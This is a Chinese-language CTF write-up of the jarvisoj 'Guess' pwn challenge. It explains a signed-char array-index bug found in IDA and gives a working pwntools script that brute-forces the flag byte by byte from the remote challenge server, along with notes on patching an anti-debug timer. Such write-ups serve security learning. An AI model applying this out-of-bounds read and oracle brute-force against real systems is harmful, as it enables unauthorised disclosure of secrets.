---
layout:     post
title:      jarvisoj Guess
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>https://www.jarvisoj.com  
>  
>Problem Description:  
>你猜，你猜，你猜不到，你猜对了就给你flag  
>  
>Download:  
>https://dn.jarvisoj.com/challengefiles/guess.0eff3b4fdf70b3d7c2108758691c9be3  
>  
>Address:  
>nc pwn.jarvisoj.com 9878  
<!-- more -->


### 0x00 IDA分析

```
1. 判断输入字符串flag_hex的长度是否等于100
2. 将unk_401100处数据复制到bin_by_hex
3. flag_hex两个字符为一组作为bin_by_hex的下标，将索引值分别赋值给value1、value2
4. 若value1、value2有一个的值为-1，则程序退出(内存数据以补码形式存储，-1的补码为0xff)
5. given_flag[i] = value2 | 16 * value1
6. 判断flag与given_flag是否相同
```

根据strings定位到handle

![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x00.png)

重点关注is_flag_correct，跟进去

![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x01.png)

漏洞出现在以下两处

![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x02.png)
![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x03.png)

再看看栈的布局

![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x04.png)

可以根据第一处漏洞传入大于127的字符，溢出成负数，通过第二处漏洞能寻址到真正的flag


### 0x01 最终的exploit


```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *
import sys
import os

context.log_level = 21  # pwntools 的日志等级 , 不输出日志

# 根据真正的flag生成100个字节长度的字符串payload，将value1置0，value2置为flag的对应字符
def get_true_flag_payload():
    offset = (-0x110) - (-0x150)
    base = 0x100 - offset # 0x100 - 0x40 = 0xc0 --> -64
    payload = ""
    for i in range(50):
        payload += "0" + chr(base)
	base += 1
    return payload

# 按照索引index将1个可打印字符的高位数值和低位数值作为2个字符逐一修改payload，实现逐一字节爆破
def get_guess_payload(index, char):
    true_flag_payload = list(get_true_flag_payload())
    high = ("%02x" % char)[0]
    low = ("%02x" % char)[1]
    true_flag_payload[index * 2 + 0] = high
    true_flag_payload[index * 2 + 1] = low
    return ''.join(str(i) for i in true_flag_payload)

def guess_once(payload):
    Io = remote(HOST, PORT)
    Io.readuntil(">")
    Io.sendline(payload)
    response = Io.readline()
    Io.close()
    return ("Yaaaay!" in response)

PROGRESS = ['-', '\\', '|', '/']
FLAG_LENGTH = 50
HOST = "pwn.jarvisoj.com"
PORT = 9878

flag = ""
TOTAL = FLAG_LENGTH * len(string.printable)
GUESSED = 0
for i in range(FLAG_LENGTH):
    for j in string.printable:
        os.system("clear")
        print "[%s] Flag : %s" % (PROGRESS[GUESSED % len(PROGRESS)], flag)
        sys.stdout.write("[+] Guessing (%s%%) : [%s]" %
                      (str(GUESSED * 100.0 / TOTAL), j) + '\r')
        sys.stdout.flush()
        payload = get_guess_payload(i, ord(j))
        GUESSED += 1
        if guess_once(payload):
            GUESSED = i * len(string.printable)
            flag += j
            break
os.system("clear")
GUESSED = TOTAL
print "[+] Flag : %s" % (flag)
```

得到flag

![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x05.png)


### 0x03 附：IDA动态调试

handle函数处有一个计时器，一般用作反调试，先nop掉

![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x06.png)
![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x07.png)
![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x08.png)
![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x09.png)
![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x0a.png)
![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x0b.png)

然后attach上去

![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x0c.png)
![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x0d.png)
![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x0e.png)
![](/assets/img/writeup/pwn/2017-07-21-jarvisoj-guess/0x0f.png)